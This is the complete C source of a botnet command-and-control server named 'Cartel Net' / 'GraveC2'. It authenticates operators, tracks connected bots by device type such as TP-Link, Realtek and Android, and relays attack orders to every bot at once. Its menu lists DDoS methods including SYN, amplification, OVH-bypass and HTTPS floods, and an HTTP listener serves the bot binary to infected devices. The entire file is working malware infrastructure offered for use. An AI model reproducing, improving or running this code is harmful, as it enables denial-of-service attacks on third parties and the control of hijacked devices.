#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <sys/stat.h>

#define BOT_PORT 6677
#define USER_PORT 6676
#define HTTP_PORT 6678
#define MAX_BOTS 100000
#define MAX_USERS 100
#define BUFFER_SIZE 1024
#define PURPLE "\033[38;5;90m"
#define WHITE "\033[37m"
#define RESET "\033[0m"
#define RED "\033[38;5;196m"
#define BLUE "\033[38;5;21m"

typedef struct {
    int sock;
    struct sockaddr_in addr;
    char bot_type[20];
} Bot;

typedef struct {
    char username[50];
    char password[50];
    char role[10];
} User;

Bot bots[MAX_BOTS];
User users[MAX_USERS];
int bot_count = 0;
int user_count = 0;
pthread_mutex_t bot_mutex = PTHREAD_MUTEX_INITIALIZER;

void load_users() {
    FILE *file = fopen("user.txt", "r");
    if (file == NULL) {
        perror("Cannot open user.txt");
        exit(1);
    }
    while (fscanf(file, "%49s %49s %9s", users[user_count].username, users[user_count].password, users[user_count].role) == 3) {
        user_count++;
        if (user_count >= MAX_USERS) break;
    }
    fclose(file);
    printf("Users loaded successfully. Total users: %d\n", user_count);
}

int authenticate_user(const char *username, const char *password) {
    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].username, username) == 0 && strcmp(users[i].password, password) == 0) {
            return i;
        }
    }
    return -1;
}

void add_bot(int sock, struct sockaddr_in addr, const char *bot_type) {
    pthread_mutex_lock(&bot_mutex);
    if (bot_count < MAX_BOTS) {
        bots[bot_count].sock = sock;
        bots[bot_count].addr = addr;
        strncpy(bots[bot_count].bot_type, bot_type, sizeof(bots[bot_count].bot_type) - 1);
        bots[bot_count].bot_type[sizeof(bots[bot_count].bot_type) - 1] = '\0';
        bot_count++;
        printf("Bot added. Total bots: %d\n", bot_count);
    } else {
        printf("Bot list is full\n");
    }
    pthread_mutex_unlock(&bot_mutex);
}

void remove_bot(int sock) {
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].sock == sock) {
            bots[i] = bots[bot_count - 1];
            bot_count--;
            printf("Bot removed. Total bots: %d\n", bot_count);
            break;
        }
    }
    pthread_mutex_unlock(&bot_mutex);
}

ssize_t read_line(int sock, char *buffer, size_t size) {
    ssize_t total = 0;
    char c;
    while (total < (ssize_t)(size - 1)) {
        ssize_t n = read(sock, &c, 1);
        if (n <= 0) break;
        if (c == '\r') continue;
        if (c == '\n') break;
        buffer[total++] = c;
    }
    buffer[total] = '\0';
    return total;
}

void send_command_to_bots(const char *command) {
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        write(bots[i].sock, command, strlen(command));
    }
    pthread_mutex_unlock(&bot_mutex);
    printf(WHITE "[CMD] Sent to %d bots: %s\n" RESET, bot_count, command);
}

void send_to_client(int sock, const char *msg) {
    write(sock, msg, strlen(msg));
    fflush(stdout);
}

void print_ascii_art(int sock) {
    const char *art =
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣶⣶⣶⡿⠟⠉\r\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀\r\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀\r\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀\r\n"
"⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀\r\n"
"⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀\r\n"
"⠀⠀⢀⣼⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠉⠙⠿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀\r\n"
"⠀⢀⣾⣿⣿⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀\r\n"
"⠀⣼⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⡄⠀⠀⠀⠀⠀\r\n"
"⢸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣧⠀⠀⠀⠀⠀\r\n"
"⣾⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⠀⠀⠀⠀⠀\r\n"
"⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀\r\n"
"⢻⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⡇⠀⠀⠀⠀⠀\r\n"
"⠘⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣷⡀⠀⣸⣿⡿⠁⠀⠀⠀⠀⠀\r\n"
"⠀⠘⣿⡄⠀⣾⣿⣷⡄⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡇⢠⣿⡿⠁⠀⠀⠀⠀⠀⠀\r\n"
"⠀⠀⠈⢻⣄⠻⣿⣿⠁⠀⠀⠀⠀⠀⠀⣼⣿⡿⢟⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀\r\n"
"⠀⠀⠀⠀⠘⠳⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"
"⠀⠀⠀⠀⠀⠀⠈⠂⠆⠠⠤⠤⣤⣤⡤⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"
"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"
"⠀⠀⠀⠀⠀⠀⢀⣤⣤⣄⠀⠀⣿⣿⣷⢠⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"
"⠀⠀⠀⠀⠀⢠⡟⠁⣦⡿⢀⣼⣿⣿⣿⣄⠀⣻⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"
"⠀⠀⠀⠀⠀⠘⢷⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\r\n"
"Type '\033[31mhelp\033[0m' to get started. \r\n";
    send_to_client(sock, art);
}

void print_prompt(int sock, const char *username) {
    char prompt[100];
    snprintf(prompt, sizeof(prompt), "%s\033[31m@\033[0mcartel > ", username);
    send_to_client(sock, prompt);
}

void *title_refresher(void *arg) {
    int sock = *((int *)arg);
    char username[50];
    strcpy(username, (char *)(arg + sizeof(int)));
    time_t start_time = time(NULL);
    free(arg);

    while (1) {
        time_t now = time(NULL);
        int elapsed = (int)difftime(now, start_time);

        int hours = elapsed / 3600;
        int minutes = (elapsed % 3600) / 60;
        int seconds = elapsed % 60;

        char title[128];
        snprintf(title, sizeof(title),
                 "\033]0;Cartel Net | Welcome, user: %s | Session Time: %02d:%02d:%02d | Bots: %d | Version: V1.0\007",
                 username, hours, minutes, seconds, bot_count);

        send_to_client(sock, title);
        sleep(1);
    }

    pthread_exit(NULL);
}

void *user_handler(void *arg) {
    int sock = *((int *)arg);
    free(arg);
    char username[50];
    char password[50];
    char buffer[BUFFER_SIZE];
    ssize_t bytes_received;
    int user_index;

    send_to_client(sock, "\033]0;Cartel Net | Login To Continue\007");
    send_to_client(sock, "Username: ");
    read_line(sock, username, sizeof(username));
    send_to_client(sock, "Password: ");
    read_line(sock, password, sizeof(password));

    user_index = authenticate_user(username, password);
    if (user_index == -1) {
        send_to_client(sock, "Authentication failed\n");
        shutdown(sock, SHUT_RDWR);
        close(sock);
        pthread_exit(NULL);
    }

    send_to_client(sock, "\033[H\033[J");

    char *args = malloc(sizeof(int) + 50);
    memcpy(args, &sock, sizeof(int));
    strcpy((char *)(args + sizeof(int)), users[user_index].username);
    pthread_t title_thread;
    pthread_create(&title_thread, NULL, title_refresher, args);
    pthread_detach(title_thread);

    print_ascii_art(sock);
    print_prompt(sock, users[user_index].username);

    while (1) {
        bytes_received = read(sock, buffer, BUFFER_SIZE - 1);
        if (bytes_received <= 0) break;
        buffer[bytes_received] = '\0';

        buffer[strcspn(buffer, "\r\n")] = 0;

        if (strcmp(buffer, "stop") == 0) {
            send_command_to_bots("stop");
            send_to_client(sock, "Stop command sent to all bots\r\n");

        } else if (strcmp(buffer, "bots") == 0) {
            pthread_mutex_lock(&bot_mutex);
            
            int zhone = 0, fiber = 0, x86_64 = 0, x86_32 = 0;
            int tplink = 0, realtek = 0, mips = 0, android = 0, unknown = 0;
            
            for (int i = 0; i < bot_count; i++) {
                if (strcmp(bots[i].bot_type, "zhone") == 0) zhone++;
                else if (strcmp(bots[i].bot_type, "fiber") == 0) fiber++;
                else if (strcmp(bots[i].bot_type, "x86_64") == 0) x86_64++;
                else if (strcmp(bots[i].bot_type, "x86_32") == 0) x86_32++;
                else if (strcmp(bots[i].bot_type, "tplink") == 0) tplink++;
                else if (strcmp(bots[i].bot_type, "realtek") == 0) realtek++;
                else if (strcmp(bots[i].bot_type, "mips") == 0) mips++;
                else if (strcmp(bots[i].bot_type, "android") == 0) android++;
                else unknown++;
            }
            
            char response[512];
            snprintf(response, sizeof(response),
                "zhone: " RED "%d" RESET "\r\n"
                "fiber: " RED "%d" RESET "\r\n"
                "x86_64: " RED "%d" RESET "\r\n"
                "x86_32: " RED "%d" RESET "\r\n"
                "tplink: " RED "%d" RESET "\r\n"
                "realtek: " RED "%d" RESET "\r\n"
                "mips: " RED "%d" RESET "\r\n"
                "android: " RED "%d" RESET "\r\n"
                "Unknown: " RED "%d" RESET "\r\n"
                "Total botcount: " RED "%d" RESET "\r\n",
                zhone, fiber, x86_64, x86_32, tplink, realtek, mips, android, unknown, bot_count);
            
            send_to_client(sock, response);
            pthread_mutex_unlock(&bot_mutex);

        } else if (strcmp(buffer, "methods") == 0) {
            const char *message =
                "Usage: send (method) (target) (port) (time)\r\n"
                "udp     - Basic UDP flood - sends UDP packets to target port\r\n"
                "tcp     - TCP connection flood - opens many TCP connections\r\n"
                "vse     - VSE (Valve Source Engine) exploit - targets game servers\r\n"
                "syn     - SYN flood - half-open TCP connections to exhaust resources\r\n"
                "amp     - Amplification attack - uses reflectors to multiply traffic\r\n"
                "nfo     - NFO - another UDP variant\r\n"
                "stdhex  - HEX payload flood - sends specific hex patterns\r\n"
                "xmas    - XMAS tree attack - packets with all flags set (FIN, URG, PSH)\r\n"
                "ovhkill - OVH bypass attack - targets OVH hosting specific\r\n"
                "std     - Standard attack - basic packet flood\r\n"
                "nfodrop - NFO variant - another specialized flood\r\n"
                "https   - HTTPS flood - targets web servers on port 443\r\n";
            send_to_client(sock, message);

        } else if (strcmp(buffer, "uinfo") == 0) {
            char response[128];
            snprintf(response, sizeof(response),
                "User: %s\r\n"
                "Rank: %s\r\n",
                users[user_index].username,
                users[user_index].role);
            send_to_client(sock, response);

        } else if (strcmp(buffer, "help") == 0) {
            const char *help_msg =
                "help\t- command list\r\n"
                "clear\t- clear screen\r\n"
                "bots\t- show total connected bots number\r\n"
                "stop\t- stops all ongoing attacks\r\n"
                "version\t- shows the botnet version\r\n"
                "credits\t- shows the credits\r\n"
                "update\t- shows the updates Changelog\r\n"
                "methods\t- show methods\r\n"
                "uinfo\t- show your user info\r\n";
            send_to_client(sock, help_msg);

        } else if (strcmp(buffer, "clear") == 0) {
            const char *clear_screen = "\033[H\033[J";
            send_to_client(sock, clear_screen);
            print_ascii_art(sock);

        } else if (strcmp(buffer, "version") == 0) {
            send_to_client(sock, "Version 1.0\r\n");

        } else if (strcmp(buffer, "credits") == 0) {
            send_to_client(sock, "Created By Maskatu\r\nTelegram: @maskatuozn\r\n");

        } else if (strcmp(buffer, "update") == 0) {
            send_to_client(sock, "Update Changelog:\r\nVersion 1.0:\r\n- Added new methods\r\n- Added HTTP server\r\n- Added stop command\r\n- Added more commands\r\n- Added methods info\r\nVersion: 1.2: \r\n- Bot Info\r\nFeatures:\r\n- Telnet Scanner Command\r\n- More Methods\r\n- Vip + Admin + Basic Methods\r\n- Concurent + Api\r\n- Cooldowns\r\n- Gifs + Mixed Colors\r\n");

        } else if (strncmp(buffer, "send ", 5) == 0) {
            send_command_to_bots(buffer + 5);
            char response[128];
            snprintf(response, sizeof(response), "Command sent to %d bots: %s\r\n", bot_count, buffer + 5);
            send_to_client(sock, response);

        } else {
            send_to_client(sock,
                "Unknown command. Type 'help' for a list of commands.\r\n");
        }

        print_prompt(sock, users[user_index].username);
    }

    shutdown(sock, SHUT_RDWR);
    close(sock);
    pthread_exit(NULL);
}
void *user_server(void *arg) {
    int server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_size = sizeof(client_addr);
    pthread_t thread_id;

    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        perror(RED "[ERROR] User socket creation failed" RESET);
        exit(1);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(USER_PORT);

    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror(RED "[ERROR] User bind failed" RESET);
        exit(1);
    }

    if (listen(server_sock, 5) < 0) {
        perror(RED "[ERROR] User listen failed" RESET);
        exit(1);
    }

    printf("[INFO] User server listening on port %d\n" RESET, USER_PORT);

    while (1) {
        printf(WHITE "[INFO] Waiting for user connection...\n" RESET);
        client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &addr_size);
        if (client_sock < 0) {
            perror(RED "[ERROR] User connection failed" RESET);
            continue;
        }
        printf(WHITE "[INFO] New user connected from %s:%d\n" RESET,
               inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        int *pclient = malloc(sizeof(int));
        *pclient = client_sock;
        pthread_create(&thread_id, NULL, user_handler, pclient);
        pthread_detach(thread_id);
    }

    close(server_sock);
    return NULL;
}

void *bot_handler(void *arg) {
    int sock = *((int *)arg);
    char buffer[BUFFER_SIZE];
    ssize_t bytes_received;
    
    bytes_received = read(sock, buffer, BUFFER_SIZE - 1);
    if (bytes_received > 0) {
        buffer[bytes_received] = '\0';
        char *bot_type = buffer;
        
        struct sockaddr_in addr;
        socklen_t addr_len = sizeof(addr);
        getpeername(sock, (struct sockaddr*)&addr, &addr_len);
        
        add_bot(sock, addr, bot_type);
    }
    
    while ((bytes_received = read(sock, buffer, BUFFER_SIZE)) > 0) {
        buffer[bytes_received] = '\0';
        printf("Received from bot: %s\n", buffer);
    }
    
    printf("Bot disconnected or error occurred for socket %d\n", sock);
    remove_bot(sock);
    shutdown(sock, SHUT_RDWR);
    close(sock);
    free(arg);
    pthread_exit(NULL);
}

void *bot_server(void *arg) {
    int server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_size = sizeof(client_addr);
    pthread_t thread_id;

    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        perror(RED "[ERROR] Bot socket creation failed" RESET);
        exit(1);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(BOT_PORT);

    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror(RED "[ERROR] Bot bind failed" RESET);
        exit(1);
    }

    if (listen(server_sock, 5) < 0) {
        perror(RED "[ERROR] Bot listen failed" RESET);
        exit(1);
    }

    printf("[INFO] Bot server listening on port %d\n" RESET, BOT_PORT);

    while (1) {
        printf(WHITE "[INFO] Waiting for bot connection...\n" RESET);
        client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &addr_size);
        if (client_sock < 0) {
            perror(RED "[ERROR] Bot connection failed" RESET);
            continue;
        }

        printf("[INFO] New bot connected from %s:%d\n" RESET,
               inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        add_bot(client_sock, client_addr, "unknown");
        int *pclient = malloc(sizeof(int));
        *pclient = client_sock;
        pthread_create(&thread_id, NULL, bot_handler, pclient);
        pthread_detach(thread_id);
    }

    close(server_sock);
    return NULL;
}

void *http_server(void *arg) {
    int server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_size = sizeof(client_addr);
    char buffer[BUFFER_SIZE];
    ssize_t bytes_received;

    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        perror(RED "[ERROR] HTTP socket creation failed" RESET);
        exit(1);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(HTTP_PORT);

    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror(RED "[ERROR] HTTP bind failed" RESET);
        exit(1);
    }

    if (listen(server_sock, 5) < 0) {
        perror(RED "[ERROR] HTTP listen failed" RESET);
        exit(1);
    }

    printf("[INFO] HTTP server listening on port %d\n" RESET, HTTP_PORT);

    while (1) {
        client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &addr_size);
        if (client_sock < 0) {
            perror(RED "[ERROR] HTTP connection failed" RESET);
            continue;
        }

        printf("[INFO] HTTP request from %s:%d\n" RESET,
               inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        bytes_received = read(client_sock, buffer, BUFFER_SIZE - 1);
        if (bytes_received > 0) {
            buffer[bytes_received] = '\0';
            
            if (strstr(buffer, "GET /bot") != NULL) {
                FILE *file = fopen("./bot", "rb");
                if (file == NULL) {
                    const char *response = 
                        "HTTP/1.1 404 Not Found\r\n"
                        "Content-Type: text/plain\r\n"
                        "Connection: close\r\n"
                        "\r\n"
                        "File not found";
                    write(client_sock, response, strlen(response));
                } else {
                    fseek(file, 0, SEEK_END);
                    long file_size = ftell(file);
                    fseek(file, 0, SEEK_SET);
                    
                    char *file_data = malloc(file_size);
                    fread(file_data, 1, file_size, file);
                    fclose(file);
                    
                    char header[256];
                    snprintf(header, sizeof(header),
                        "HTTP/1.1 200 OK\r\n"
                        "Content-Type: application/octet-stream\r\n"
                        "Content-Length: %ld\r\n"
                        "Content-Disposition: attachment; filename=\"bot\"\r\n"
                        "Connection: close\r\n"
                        "\r\n", file_size);
                    
                    write(client_sock, header, strlen(header));
                    write(client_sock, file_data, file_size);
                    
                    free(file_data);
                    printf("[INFO] Bot file sent to %s:%d\n" RESET,
                           inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
                }
            } else {
                const char *response = 
                    "HTTP/1.1 200 OK\r\n"
                    "Content-Type: text/html\r\n"
                    "Connection: close\r\n"
                    "\r\n"
                    "<html><body><h1>GraveC2 Server</h1><p>Bot file available at <a href=\"/bot\">/bot</a></p></body></html>";
                write(client_sock, response, strlen(response));
            }
        }
        
        shutdown(client_sock, SHUT_RDWR);
        close(client_sock);
    }

    close(server_sock);
    return NULL;
}

int main() {
    pthread_t user_thread, bot_thread, http_thread;

    load_users();

    pthread_create(&user_thread, NULL, user_server, NULL);
    pthread_create(&bot_thread, NULL, bot_server, NULL);
    pthread_create(&http_thread, NULL, http_server, NULL);

    pthread_join(user_thread, NULL);
    pthread_join(bot_thread, NULL);
    pthread_join(http_thread, NULL);

    return 0;
}